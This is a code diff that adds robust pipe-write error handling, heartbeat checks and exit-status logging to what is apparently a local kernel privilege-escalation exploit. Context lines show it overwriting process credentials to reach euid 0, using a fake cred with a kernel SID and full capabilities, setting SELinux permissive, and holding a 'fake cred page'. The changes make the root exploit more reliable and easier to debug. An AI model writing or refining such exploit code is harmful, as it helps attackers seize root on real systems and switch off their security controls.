@@ -105,6 +105,40 @@ static unsigned g_t_page_alloc, g_t_page_free;
 static void logf(const char *fmt, ...);
 static long now_ms(void);
 
+/*
+ * Write the child's report back to the parent and report a failure.
+ *
+ * `SIGPIPE` is ignored, so a broken pipe surfaces as EPIPE here instead of
+ * killing the child.  That used to be invisible: the write was `(void)`, the
+ * child exited 0, and the parent only logged "child report missing".  The
+ * errno is printed now so the two failures ("parent closed the pipe" vs "the
+ * kernel killed the writer") can be told apart from the log.
+ */
+static int send_report(const void *buf, size_t len, const char *what)
+{
+    size_t off = 0;
+
+    while (off < len)
+    {
+        ssize_t n = write(4, (const char *)buf + off, len - off);
+
+        if (n < 0)
+        {
+            if (errno == EINTR)
+                continue;
+            logf("[-] child %s write failed off=%zu errno=%d\n", what, off, errno);
+            return -1;
+        }
+        if (n == 0)
+        {
+            logf("[-] child %s write stalled off=%zu\n", what, off);
+            return -1;
+        }
+        off += (size_t)n;
+    }
+    return 0;
+}
+
 static void slab_usage(const char *tag)
 {
     FILE *f = fopen("/proc/slabinfo", "r");
@@ -1793,13 +1827,33 @@ static int wait_child_main(const char *mode)
         _exit(130);
     if (read(3, &ch, 1) != 1)
         _exit(131);
-    close(3);
-    /* Heartbeat immediately after wake (before any other work): proves wake
-     * receipt even when the child dies before its report (n=0 diagnosis). */
+    /*
+     * Heartbeat first, and `close(3)` only afterwards.
+     *
+     * Every write back to the parent used to be `(void)write(...)`: with
+     * SIGPIPE ignored a broken pipe returns EPIPE instead of killing the
+     * child, so the child could keep running and exit 0 while the parent
+     * reported "no child heartbeat".  Nothing in the log said why.  Each
+     * write is checked now, and a failure is named on stdout so the parent's
+     * log shows the real cause instead of a missing line.
+     */
     {
         char hb = (char)0x48; /* 'H' */
-        (void)write(4, &hb, sizeof(hb));
+        ssize_t w;
+
+        /*
+         * A short or interrupted heartbeat write would shift the framing: the
+         * parent would read the first byte of the 32-byte report as a
+         * heartbeat and then log a successful report as missing.  Retry the
+         * single byte and, if it still fails, say so instead of continuing.
+         */
+        do
+            w = write(4, &hb, sizeof(hb));
+        while (w < 0 && errno == EINTR);
+        if (w != (ssize_t)sizeof(hb))
+            logf("[-] child heartbeat write failed ret=%zd errno=%d\n", w, errno);
     }
+    close(3);
     int child_safemode = (ch == (char)0x53); /* 'S' = wake with safemode */
 
     memset(&rep, 0, sizeof(rep));
@@ -1812,7 +1866,7 @@ static int wait_child_main(const char *mode)
     if (rep.euid != 0)
     {
         rep.setuid_ret = -1;
-        (void)write(4, &rep, sizeof(rep));
+        send_report(&rep, sizeof(rep), "report");
         close(4);
         logf("[-] child euid is not 0: cred write did not land\n");
         _exit(3);
@@ -1828,7 +1882,7 @@ static int wait_child_main(const char *mode)
         pid_t w;
         (void)w;
 
-        (void)write(4, &rep, sizeof(rep));
+        send_report(&rep, sizeof(rep), "report");
         close(4);
 
         /* Fake cred carries kernel SID + FULLCAP. Set SELinux permissive from
@@ -1905,7 +1959,7 @@ static int wait_child_main(const char *mode)
         rep.reuid = (int)eu;
         rep.rsuid = (int)su;
     }
-    (void)write(4, &rep, sizeof(rep));
+    send_report(&rep, sizeof(rep), "resuid report");
     close(4);
     logf("[child] resuid=%d/%d/%d setuid_ret=%d errno=%d\n",
          rep.ruid, rep.reuid, rep.rsuid, rep.setuid_ret, rep.setuid_errno);
@@ -2412,8 +2466,31 @@ int main(int argc, char **argv)
         logf("[*] safemode ON: modules will be disabled natively pre-load\n");
     logf("[+] cred writes landed, waking child\n");
 
-    if (write(go_fd, (argc > 2 && !strcmp(argv[2], "safemode")) ? "S" : "A", 1) != 1)
-        logf("[!] child wake write failed\n");
+    /*
+     * Wake the child and say exactly what happened.
+     *
+     * The old code wrote one byte and only logged "child wake write failed"
+     * without a reason.  A pipe write can also come back short or EINTR, and
+     * a failed wake means the child stays blocked in read(3) forever -- which
+     * the parent then reports as a missing heartbeat, hiding the real cause.
+     * EINTR/EAGAIN are retried; EPIPE and anything else is named.
+     */
+    {
+        char wake = (argc > 2 && !strcmp(argv[2], "safemode")) ? 'S' : 'A';
+        ssize_t wn;
+
+        do
+            wn = write(go_fd, &wake, 1);
+        while (wn < 0 && (errno == EINTR || errno == EAGAIN));
+        if (wn != 1)
+        {
+            int werr = errno;
+
+            logf("[!] child wake write failed ret=%zd errno=%d (%s)\n", wn, werr,
+                 werr == EPIPE ? "reader already gone"
+                               : "child never saw the wake byte");
+        }
+    }
     close(go_fd);
 
     {
@@ -2427,34 +2504,67 @@ int main(int argc, char **argv)
          * a 5 s probe and then waiting for the report anyway made a child that
          * was merely starved look like a failed write.
          */
-        long t_end = now_ms() + 30000;
+        long t_start = now_ms();
+        long t_end = t_start + 30000;
         char hb = 0;
         ssize_t hn = 0;
+        int eof = 0;
+        int broken = 0;
 
         memset(&rep, 0, sizeof(rep));
         while (hn != 1 && now_ms() < t_end)
         {
             int pr = poll(&pf, 1, 200);
 
-            if (pr < 0 && errno == EINTR)
-                continue;
-            if (pr <= 0)
+            if (pr < 0)
+            {
+                /* EINTR is transient; anything else means the fd is unusable
+                 * and polling it again would spin at 100 % CPU. */
+                if (errno == EINTR)
+                    continue;
+                broken = 1;
+                break;
+            }
+            if (pr == 0)
                 continue;
             hn = read(st_fd, &hb, 1);
             if (hn == 0)
+            {
+                eof = 1;
                 break;
+            }
+            if (hn < 0 && errno != EINTR)
+            {
+                broken = 1;
+                break;
+            }
         }
         if (hn == 1 && hb == (char)0x48)
             logf("[+] child heartbeat: wake received\n");
+        else if (eof)
+            /*
+             * EOF, not a timeout: every write end of the report pipe is
+             * closed, so no byte can ever arrive.  Saying "no heartbeat" here
+             * used to look like a slow child; it is a dead pipe, and the
+             * child's own "heartbeat write failed errno=" line names why.
+             */
+            logf("[!] child report pipe closed before the heartbeat (n=0, EOF)\n");
+        else if (broken)
+            logf("[!] child report pipe unusable errno=%d\n", errno);
         else
-            logf("[!] no child heartbeat (n=%zd)\n", hn);
+            logf("[!] no child heartbeat within %ldms (pipe still open)\n",
+                 now_ms() - t_start);
         while (hn == 1 && got < (ssize_t)sizeof(rep) && now_ms() < t_end)
         {
             int pr = poll(&pf, 1, 500);
 
-            if (pr < 0 && errno == EINTR)
-                continue;
-            if (pr <= 0)
+            if (pr < 0)
+            {
+                if (errno == EINTR)
+                    continue;
+                break;
+            }
+            if (pr == 0)
                 continue;
             {
                 ssize_t rn = read(st_fd, (char *)&rep + got, sizeof(rep) - got);
@@ -2475,7 +2585,8 @@ int main(int argc, char **argv)
         }
         else
         {
-            logf("[!] child report missing (got=%zd/%zu)\n", got, sizeof(rep));
+            logf("[!] child report missing (got=%zd/%zu, heartbeat=%s)\n", got,
+                 sizeof(rep), hn == 1 ? "yes" : "no");
         }
     }
 
@@ -2483,7 +2594,19 @@ int main(int argc, char **argv)
         int st = 0;
 
         if (waitpid(C, &st, 0) == C)
-            logf("[+] child exit status=%#x\n", st);
+        {
+            /*
+             * WIFEXITED/WIFSIGNALED: `status=0` alone cannot distinguish a
+             * clean exit from one the child never performed, and a signal is
+             * the one thing that explains a dead report pipe without a
+             * matching "write failed" line from the child.
+             */
+            if (WIFSIGNALED(st))
+                logf("[!] child killed by signal %d (%s)\n", WTERMSIG(st),
+                     strsignal(WTERMSIG(st)));
+            else
+                logf("[+] child exit status=%d\n", WEXITSTATUS(st));
+        }
     }
     if (g_fake_stage)
         park_forever("fake cred page held; reboot to clean");
